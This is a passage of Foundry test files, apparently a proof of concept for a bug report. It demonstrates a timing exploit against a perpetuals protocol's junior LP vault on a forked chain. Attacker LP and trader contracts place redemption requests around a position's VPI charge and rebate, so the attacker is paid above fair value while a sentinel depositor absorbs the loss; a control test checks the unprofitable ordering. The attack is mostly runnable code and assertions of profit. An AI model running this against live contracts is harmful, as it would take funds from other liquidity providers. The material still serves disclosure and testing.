_warp(T_REQUEST_DEFERRED);
uint256 aRedeemId = attackerLp.requestAllJuniorRedeem(DEPOSIT_EPOCH);
require(aRedeemId == 498164, "attacker redeem epoch unexpected");
uint256 juniorPre = pool.juniorPrincipal();
_warp(T_BANK);
vm.recordLogs();
router.settleLpEpoch(_payload(Ticks.T3_SETTLE_163));
VmLog[] memory bankLogs = vm.getRecordedLogs();
uint256 bankJuniorRedeemAssets;
uint256 bankJuniorDepositAssets;
bool sawBankSettle;
for (uint256 i = 0; i < bankLogs.length; i++) {
if (bankLogs[i].topics[0] == LP_EPOCH_SETTLED_TOPIC) {
(, uint256 juniorRedeem, uint256 juniorDeposit,,,,) = abi.decode(
bankLogs[i].data, (uint256, uint256, uint256, uint256, bool, bool, bool)
);
bankJuniorRedeemAssets = juniorRedeem;
bankJuniorDepositAssets = juniorDeposit;
sawBankSettle = true;
}
}
require(sawBankSettle, "banking settle emitted no LpEpochSettled");
uint256 juniorPostBank = pool.juniorPrincipal();
uint256 banked = juniorPostBank - juniorPre - bankJuniorDepositAssets;
console2.log("junior revenue banked at ep498163 settle (net of T2):", banked);
console2.log("juniorRedeem/DepositAssets at the banking pass:", bankJuniorRedeemAssets, bankJuniorDepositAssets);
require(banked >= (vpiCharged * 7) / 10, "banking settle did not book the returnable VPI");
require(bankJuniorRedeemAssets == 0, "banking pass funded a redemption");
require(bankJuniorDepositAssets == SENTINEL_JUNIOR, "T2 deposit not the banking progress");
require(attackerLp.wallet() == 0, "redemption paid at the banking pass");
uint256 t2Shares = sentinel.juniorShares(498163);
console2.log("sentinel T1 vs T2 shares (same 0.5M):", sShares, t2Shares);
require(t2Shares < sShares, "T2 not priced at the inflated principal");
require(sShares - t2Shares >= (sShares * vpiCharged * 7) / (juniorP0 * 10), "T2 inflation below 70% of V");
_warp(T_DEF_SETTLE);
router.settleLpEpoch(_payload(Ticks164.T5_DEF_SETTLE_164));
uint256 attackerPayout = attackerLp.claimJuniorRedeem(aRedeemId);
console2.log("attacker deferred-epoch payout:", attackerPayout);
uint256 fairAttacker = (juniorP0 * aShares) / supply0;
uint256 expectedHarvest = (vpiCharged * aShares) / supply0;
console2.log("fair payout at pre-window principal:", fairAttacker);
console2.log("expected harvest f*V:", expectedHarvest);
console2.log("excess over fair:", attackerPayout - fairAttacker);
require(attackerPayout > fairAttacker, "deferred redemption not paid above fair");
require(attackerPayout - fairAttacker >= (expectedHarvest * 5) / 10, "deferred harvest below 50% of f*V");
require(attackerPayout - fairAttacker > MIN_PROFIT, "deferred harvest below materiality floor");
_warp(T_CLOSE - 11);
uint64 cid = attackerTrader.commitOrder(
"attacker-close", CfdTypes.Side.LONG, SIZE, 0, 2e8, true, 60, 3, configHash
);
uint256 assetsPreClose = pool.totalAssets();
uint256 juniorPreClose = pool.juniorPrincipal();
vm.recordLogs();
_warp(T_CLOSE);
OrderV3Types.ExecutionResult memory cr = attackerTrader.executeOrder(cid, _payload(Ticks164.T6_CLOSE_164));
console2.log("close status:", uint256(cr.status));
require(cr.status == OrderV3Types.LifecycleStatus.Executed, "close did not execute");
VmLog[] memory logs = vm.getRecordedLogs();
uint256 rebateAssessed;
uint256 rebatePaid;
uint256 rebateWaived;
bool sawRebate;
for (uint256 i = 0; i < logs.length; i++) {
if (logs[i].topics[0] == ACTION_REBATE_TOPIC) {
(uint256 assessed, uint256 paid, uint256 waived) =
abi.decode(logs[i].data, (uint256, uint256, uint256));
rebateAssessed = assessed;
rebatePaid = paid;
rebateWaived = waived;
sawRebate = true;
}
}
require(sawRebate, "no ActionRebateSettled event at the close");
uint256 poolOutAtClose = assetsPreClose - pool.totalAssets();
(uint256 sz2,,,,,, int256 vpi2) = engine.positions(address(attackerTrader));
require(sz2 == 0, "position not closed");
require(vpi2 == 0, "lifetime VPI accrual not returned in full");
console2.log("rebate assessed/paid/waived:", rebateAssessed, rebatePaid, rebateWaived);
console2.log("pool totalAssets outflow at close:", poolOutAtClose);
require(rebateWaived == 0, "rebate partially waived");
require(rebatePaid == rebateAssessed, "rebate not paid in full");
require(rebatePaid > (vpiCharged * 7) / 10, "rebate below the booked accrual");
require(rebatePaid <= vpiCharged, "rebate exceeded the booked accrual");
console2.log("accrual minus paid (close exec fee + carry):", vpiCharged - rebatePaid);
require(pool.juniorPrincipal() == juniorPreClose, "close moved juniorPrincipal");
_warp(T_REQUEST_SENTINEL);
uint256 sRedeemId = sentinel.requestAllJuniorRedeem(DEPOSIT_EPOCH);
require(sRedeemId == 498165, "sentinel redeem epoch unexpected");
uint256 juniorPreAbsorb = pool.juniorPrincipal();
uint256 seniorPreAbsorb = pool.seniorPrincipal();
_warp(T_AFTER);
pool.settleLpEpoch(0, 0);
uint256 juniorPostAbsorb = pool.juniorPrincipal();
uint256 absorbed = juniorPreAbsorb - juniorPostAbsorb;
console2.log("juniorPrincipal pre/post absorb settle:", juniorPreAbsorb, juniorPostAbsorb);
console2.log("junior-first absorbed at post-close settle:", absorbed);
require(pool.seniorPrincipal() <= seniorPreAbsorb + (seniorPreAbsorb / 10_000), "senior absorbed the shortfall");
require(absorbed > MIN_PROFIT, "no junior-first absorption at post-close settle");
uint256 sentinelPayout = sentinel.claimJuniorRedeem(sRedeemId);
console2.log("sentinel post-window payout:", sentinelPayout);
uint256 absorbedShortfall = juniorPreAbsorb - juniorPostAbsorb - sentinelPayout;
console2.log("pure junior-first shortfall absorb:", absorbedShortfall);
require(absorbedShortfall > (vpiCharged * 5) / 10, "shortfall absorb below half the accrual");
uint256 perShareA = (attackerPayout * 1e12) / aShares;
uint256 perShareS = (sentinelPayout * 1e12) / sShares;
console2.log("per-share attacker vs sentinel (1e12 scale):", perShareA, perShareS);
require(perShareA > perShareS, "sentinel not impaired vs attacker");
require(perShareA - perShareS >= ((expectedHarvest * 1e12) * 4) / (10 * supply0), "window differential too small");
uint256 traderValue = attackerTrader.totalValue();
console2.log("trader final value (wallet+mch):", traderValue);
console2.log("coalition net USDG (deferred window):", attackerLp.wallet() + traderValue - ATTACKER_JUNIOR - TRADER_FUNDS);
require(usdg.balanceOf(address(attackerLp)) + traderValue > ATTACKER_JUNIOR + TRADER_FUNDS + MIN_PROFIT, "coalition not profitable in the deferred window");
}
}
```

### test/VpiSameEpochPoc.sol (variant and control)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.35;
import {Ticks} from "./Ticks.sol";
import {IERC20, IRouter, IVault, ILifecycleBook} from "./VpiCrossEpochPoc.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";
interface Vm {
function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
function envString(string calldata name) external returns (string memory);
function warp(uint256 timestamp) external;
function roll(uint256 blockNumber) external;
function chainId(uint256 newChainId) external;
}
interface IClearinghouse {
function depositMargin(uint256 amount) external;
function withdrawMargin(uint256 amount) external;
function getAccountAssetBuckets(address account)
external
view
returns (uint256 settlementBalance, uint256 totalLocked, uint256 activePositionMargin, uint256 otherLocked, uint256 free);
function vpiRebateReserveAssets(address account) external view returns (uint256);
}
interface IEngine {
function positions(address account)
external
view
returns (uint256 size, uint256 margin, uint256 entryPrice, uint256 maxProfitAssets, CfdTypes.Side side, uint64 lastUpdateTime, int256 vpiAccrued);
function sides(uint256 index)
external
view
returns (uint256 maxProfitAssets, uint256 openInterest, uint256 entryNotional, uint256 totalMargin);
function lastMarkPrice() external view returns (uint256);
function lastMarkTime() external view returns (uint64);
function totalTraderClaimBalanceAssets() external view returns (uint256);
function terminalNavSnapshot()
external
view
returns (uint32 markPrice, uint64 markTime, int256 terminalLpPriceDeltaAssets, uint256 totalTraderClaimsAssets, uint256 maxDirectionalLiabilityAssets, uint64 bookVersion, bool hasOpenPositions, bool degradedMode);
}
interface IPool {
struct LpEpochSettlementResult {
uint256 cutoffEpoch;
uint256 seniorFundedShares;
uint256 seniorFundedAssets;
uint256 juniorFundedShares;
uint256 juniorFundedAssets;
uint256 seniorProcessedEpochs;
uint256 juniorProcessedEpochs;
uint256 juniorDepositAssets;
uint256 juniorDepositShares;
uint256 seniorDepositAssets;
uint256 seniorDepositShares;
bool seniorBacklog;
bool juniorBacklog;
bool entriesDeferred;
}
function totalAssets() external view returns (uint256);
function seniorPrincipal() external view returns (uint256);
function juniorPrincipal() external view returns (uint256);
function settleLpEpoch(uint256 expectedMarkPrice, uint256 expectedPublishTime)
external returns (LpEpochSettlementResult memory result);
}
contract Trader {
IERC20 internal constant usdg = IERC20(0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D);
IClearinghouse internal constant mch = IClearinghouse(0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A);
IRouter internal constant router = IRouter(0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444);
function fund(uint256 amount) external {
usdg.mint(address(this), amount);
usdg.approve(address(mch), type(uint256).max);
mch.depositMargin(amount);
}
function totalValue() external view returns (uint256) {
(uint256 settlement, uint256 locked, uint256 posMargin,,) = mch.getAccountAssetBuckets(address(this));
require(posMargin == 0, "position margin still locked");
return usdg.balanceOf(address(this)) + settlement + locked;
}
function commitOrder(
bytes32 clientOrderId,
CfdTypes.Side side,
uint256 sizeDelta,
uint256 marginDelta,
uint256 targetPrice,
bool isClose,
uint32 executionWindowSeconds,
bytes32 configHash
) external returns (uint64 orderId) {
OrderV3Types.ExecutionBounds memory bounds = OrderV3Types.ExecutionBounds({
submitBy: type(uint64).max,
executionWindowSeconds: executionWindowSeconds,
allowedExecutionModes: 1,
expectedConfigHash: configHash,
maxExecutionBountyAssets: type(uint128).max,
maxExecutionNotionalAssets: type(uint128).max,
maxGrossAccountDebitAssets: type(uint128).max,
maxActionChargeAssets: type(uint128).max,
maxExplicitFeesAssets: type(uint128).max,
maxPostPositionSize: type(uint120).max,
minPostSettlementBalanceAssets: 0,
minPostPositionEquityAssets: 0,
maxPostLeverageBps: type(uint32).max
});
OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
clientOrderId: clientOrderId,
side: side,
sizeDelta: sizeDelta,
marginDelta: marginDelta,
targetPrice: targetPrice,
isClose: isClose,
bounds: bounds
});
return router.commitOrder(request);
}
function executeOrder(uint64 orderId, bytes[] calldata payload)
external returns (OrderV3Types.ExecutionResult memory result)
{
return router.executeOrder(orderId, payload);
}
}
contract Lp {
IERC20 internal constant usdg = IERC20(0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D);
IVault internal constant junior = IVault(0x4A8b67184a1E3224c11A191cc69F22C50EEf734e);
function depositJunior(uint256 assets) external returns (uint256 requestId) {
usdg.mint(address(this), assets);
usdg.approve(address(junior), type(uint256).max);
return junior.requestDeposit(assets, address(this));
}
function requestAllJuniorRedeem(uint256 depositRequestId) external returns (uint256 redeemRequestId) {
uint256 shares = junior.claimableDepositShares(depositRequestId, address(this));
return junior.requestRedeemFromClaimableDeposit(depositRequestId, shares, address(this));
}
function claimJuniorRedeem(uint256 redeemRequestId) external returns (uint256 assets) {
uint256 shares = junior.claimableRedeemRequest(redeemRequestId, address(this));
require(shares > 0, "nothing claimable");
return junior.redeem(shares, address(this), address(this));
}
function juniorShares(uint256 depositRequestId) external view returns (uint256) {
return junior.claimableDepositShares(depositRequestId, address(this));
}
function wallet() external view returns (uint256) {
return usdg.balanceOf(address(this));
}
}
contract VpiWindowHarvestTest {
Vm internal constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IERC20 internal constant usdg = IERC20(0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D);
IClearinghouse internal constant mch = IClearinghouse(0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A);
IRouter internal constant router = IRouter(0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444);
IEngine internal constant engine = IEngine(0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA);
IPool internal constant pool = IPool(0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e);
ILifecycleBook internal constant book = ILifecycleBook(0x327d5fd04e17D96DD5C4F845A0b4256A9e19645C);
IVault internal constant juniorVault = IVault(0x4A8b67184a1E3224c11A191cc69F22C50EEf734e);
uint256 internal constant SIZE = 19_000e20;
uint256 internal constant ATTACKER_JUNIOR = 2_500_000e6;
uint256 internal constant SENTINEL_JUNIOR = 500_000e6;
uint256 internal constant TRADER_FUNDS = 120_000e6;
uint256 internal constant ORDER_MARGIN = 50_000e6;
uint256 internal constant MIN_PROFIT = 20e6;
uint256 internal constant DEPOSIT_EPOCH = 498161;
Trader internal attackerTrader;
Lp internal attackerLp;
Lp internal sentinel;
bytes32 internal configHash;
uint256 internal constant T_DEPOSIT = 1_793_379_000;
uint256 internal constant T_ACTIVATE = 1_793_382_400;
uint256 internal constant T_REQUEST_WINDOW = 1_793_386_100;
uint64 internal constant T_OPEN = 1_793_386_811;
uint256 internal constant T_REQUEST_LATE = 1_793_386_900;
uint64 internal constant T_SETTLE = 1_793_386_919;
uint64 internal constant T_CLOSE = 1_793_386_983;
uint256 internal constant T_AFTER = 1_793_390_500;
function setUp() public {
vm.createSelectFork(vm.envString("HUNT_FORK_URL"), 324710693);
vm.chainId(31337);
configHash = book.currentExecutionConfigHash();
attackerTrader = new Trader();
attackerLp = new Lp();
sentinel = new Lp();
attackerTrader.fund(TRADER_FUNDS);
(uint256 mpL, uint256 oiL,,) = engine.sides(0);
(uint256 mpS, uint256 oiS,,) = engine.sides(1);
require(oiL == 0 && oiS == 0, "pin has open positions - timeline assumption broken");
mpL;
mpS;
console2.log("pool totalAssets at pin:", pool.totalAssets());
console2.log("seniorPrincipal at pin:", pool.seniorPrincipal());
console2.log("juniorPrincipal at pin:", pool.juniorPrincipal());
console2.log("junior supply at pin:", juniorVault.accruedTotalSupply());
console2.log("mark at pin:", engine.lastMarkPrice(), engine.lastMarkTime());
}
function _warp(uint256 t) internal {
vm.roll(block.number + 60);
vm.warp(t);
}
function _payload(bytes memory blob) internal pure returns (bytes[] memory p) {
p = new bytes[](1);
p[0] = blob;
}
function _open() internal returns (uint256 vpiCharged, uint256 poolInflow) {
_warp(T_OPEN - 1);
uint64 oid = attackerTrader.commitOrder(
"vpiwin-open", CfdTypes.Side.LONG, SIZE, ORDER_MARGIN, 1, false, 60, configHash
);
uint256 assetsBefore = pool.totalAssets();
_warp(T_OPEN + 10);
OrderV3Types.ExecutionResult memory r = attackerTrader.executeOrder(oid, _payload(Ticks.T1_B_OPEN_163));
console2.log("open status/terminal/pending:", uint256(r.status), uint256(r.terminalReason), uint256(r.pendingReason));
require(r.status == OrderV3Types.LifecycleStatus.Executed, "open did not execute");
poolInflow = pool.totalAssets() - assetsBefore;
(uint256 sz,,,, CfdTypes.Side side,, int256 vpi) = engine.positions(address(attackerTrader));
require(sz == SIZE && side == CfdTypes.Side.LONG, "long not open");
require(vpi > 0, "open carried no positive VPI charge");
vpiCharged = uint256(vpi);
}
function _close() internal returns (uint256 rebatePaid) {
_warp(T_CLOSE - 1);
uint64 oid = attackerTrader.commitOrder(
"vpiwin-close", CfdTypes.Side.LONG, SIZE, 0, 2e8, true, 60, configHash
);
uint256 assetsBefore = pool.totalAssets();
_warp(T_CLOSE + 10);
OrderV3Types.ExecutionResult memory r = attackerTrader.executeOrder(oid, _payload(Ticks.T4_B_CLOSE_163));
console2.log("close status/terminal/pending:", uint256(r.status), uint256(r.terminalReason), uint256(r.pendingReason));
require(r.status == OrderV3Types.LifecycleStatus.Executed, "close did not execute");
rebatePaid = assetsBefore - pool.totalAssets();
(uint256 sz,,,,,, ) = engine.positions(address(attackerTrader));
require(sz == 0, "position not closed");
}
function _seedLps() internal returns (uint256 aShares, uint256 sShares, uint256 juniorP0, uint256 supply0) {
_warp(T_DEPOSIT);
uint256 aReq = attackerLp.depositJunior(ATTACKER_JUNIOR);
uint256 sReq = sentinel.depositJunior(SENTINEL_JUNIOR);
require(aReq == DEPOSIT_EPOCH && sReq == DEPOSIT_EPOCH, "deposit epochs unexpected");
_warp(T_ACTIVATE);
pool.settleLpEpoch(0, 0);
aShares = attackerLp.juniorShares(DEPOSIT_EPOCH);
sShares = sentinel.juniorShares(DEPOSIT_EPOCH);
require(aShares > 0 && sShares > 0, "deposits not activated");
juniorP0 = pool.juniorPrincipal();
supply0 = juniorVault.accruedTotalSupply();
console2.log("attacker junior shares:", aShares);
console2.log("sentinel junior shares:", sShares);
console2.log("juniorPrincipal after activation:", juniorP0);
console2.log("junior supply after activation:", supply0);
console2.log("pool depth after activation:", pool.totalAssets());
}
function testInsideWindowHarvest() public {
(uint256 aShares, uint256 sShares, uint256 juniorP0, uint256 supply0) = _seedLps();
_warp(T_REQUEST_WINDOW);
uint256 aRedeemId = attackerLp.requestAllJuniorRedeem(DEPOSIT_EPOCH);
require(aRedeemId == 498163, "attacker redeem epoch unexpected");
(uint256 vpiCharged, uint256 poolInflow) = _open();
console2.log("VPI charge V collected at open:", vpiCharged);
console2.log("pool totalAssets inflow at open:", poolInflow);
require(poolInflow >= vpiCharged, "VPI cash did not arrive at the pool");
_warp(T_REQUEST_LATE);
uint256 sRedeemId = sentinel.requestAllJuniorRedeem(DEPOSIT_EPOCH);
require(sRedeemId == 498164, "sentinel redeem epoch unexpected");
uint256 juniorPre = pool.juniorPrincipal();
uint256 seniorPre = pool.seniorPrincipal();
_warp(T_SETTLE + 10);
router.settleLpEpoch(_payload(Ticks.T3_SETTLE_163));
uint256 juniorPostSettle = pool.juniorPrincipal();
console2.log("juniorPrincipal pre/post harvest settle:", juniorPre, juniorPostSettle);
uint256 attackerPayout = attackerLp.claimJuniorRedeem(aRedeemId);
console2.log("attacker inside-window payout:", attackerPayout);
uint256 surplus = juniorPostSettle + attackerPayout - juniorPre;
console2.log("junior revenue booked at the in-window settle:", surplus);
require(surplus >= (vpiCharged * 7) / 10, "settle did not bank the returnable VPI");
uint256 fairAttacker = (juniorP0 * aShares) / supply0;
uint256 expectedHarvest = (vpiCharged * aShares) / supply0;
console2.log("fair payout at pre-window principal:", fairAttacker);
console2.log("expected harvest f*V:", expectedHarvest);
console2.log("excess over fair:", attackerPayout - fairAttacker);
require(attackerPayout > fairAttacker, "attacker not paid above fair");
require(attackerPayout - fairAttacker >= (expectedHarvest * 6) / 10, "harvest below 60% of f*V");
require(attackerPayout - fairAttacker > MIN_PROFIT, "harvest below materiality floor");
uint256 rebatePaid = _close();
console2.log("pool cash outflow at close (rebate + fees):", rebatePaid);
require(rebatePaid > 0, "close paid no rebate");
console2.log("vpiRebateReserve after close:", mch.vpiRebateReserveAssets(address(attackerTrader)));
uint256 juniorPreAbsorb = pool.juniorPrincipal();
uint256 seniorPreAbsorb = pool.seniorPrincipal();
_warp(T_AFTER);
pool.settleLpEpoch(0, 0);
uint256 juniorPostAbsorb = pool.juniorPrincipal();
uint256 absorbed = juniorPreAbsorb - juniorPostAbsorb;
console2.log("juniorPrincipal pre/post absorb settle:", juniorPreAbsorb, juniorPostAbsorb);
console2.log("junior-first absorbed at post-close settle:", absorbed);
uint256 sentinelPayout = sentinel.claimJuniorRedeem(sRedeemId);
console2.log("sentinel after-window payout:", sentinelPayout);
require(pool.seniorPrincipal() <= seniorPreAbsorb + (seniorPreAbsorb / 10_000), "senior absorbed the shortfall");
require(absorbed > MIN_PROFIT, "no junior-first absorption at post-close settle");
uint256 perShareA = (attackerPayout * 1e12) / aShares;
uint256 perShareS = (sentinelPayout * 1e12) / sShares;
console2.log("per-share attacker vs sentinel (1e12 scale):", perShareA, perShareS);
require(perShareA > perShareS, "sentinel not impaired vs attacker");
require(perShareA - perShareS >= ((expectedHarvest * 1e12) * 4) / (10 * supply0), "window differential too small");
uint256 traderValue = attackerTrader.totalValue();
console2.log("trader final value (wallet+mch):", traderValue);
uint256 coalitionNet =
attackerLp.wallet() + traderValue - ATTACKER_JUNIOR - TRADER_FUNDS;
console2.log("coalition net USDG (inside window):", coalitionNet);
console2.log("seniorPrincipal pre-window vs end:", seniorPre, pool.seniorPrincipal());
require(usdg.balanceOf(address(attackerLp)) + traderValue > ATTACKER_JUNIOR + MIN_PROFIT, "coalition not profitable inside the window");
}
function testAfterCloseOrdering() public {
(uint256 aShares,, uint256 juniorP0, uint256 supply0) = _seedLps();
_warp(T_REQUEST_LATE);
uint256 aRedeemId = attackerLp.requestAllJuniorRedeem(DEPOSIT_EPOCH);
require(aRedeemId == 498164, "attacker late redeem epoch unexpected");
(uint256 vpiCharged,) = _open();
console2.log("VPI charge V collected at open:", vpiCharged);
uint256 rebatePaid = _close();
console2.log("pool cash outflow at close:", rebatePaid);
require(rebatePaid > 0, "close paid no rebate");
uint256 juniorPreAbsorb = pool.juniorPrincipal();
_warp(T_AFTER);
pool.settleLpEpoch(0, 0);
uint256 juniorPostAbsorb = pool.juniorPrincipal();
console2.log("juniorPrincipal pre/post funding settle:", juniorPreAbsorb, juniorPostAbsorb);
uint256 attackerPayout = attackerLp.claimJuniorRedeem(aRedeemId);
console2.log("attacker after-close payout:", attackerPayout);
uint256 fairAttacker = (juniorP0 * aShares) / supply0;
uint256 expectedHarvest = (vpiCharged * aShares) / supply0;
console2.log("fair payout at pre-window principal:", fairAttacker);
console2.log("expected (declined) harvest f*V:", expectedHarvest);
require(
attackerPayout < fairAttacker + (expectedHarvest * 4) / 10,
"after-close redemption still harvested the returnable VPI"
);
uint256 traderValue = attackerTrader.totalValue();
int256 coalitionNet = int256(attackerLp.wallet() + traderValue) - int256(ATTACKER_JUNIOR + TRADER_FUNDS);
console2.log("coalition net USDG (after-close ordering):", coalitionNet);
require(int256(usdg.balanceOf(address(attackerLp)) + traderValue) <= int256(ATTACKER_JUNIOR + TRADER_FUNDS), "after-close ordering must not be profitable");
}
}
```
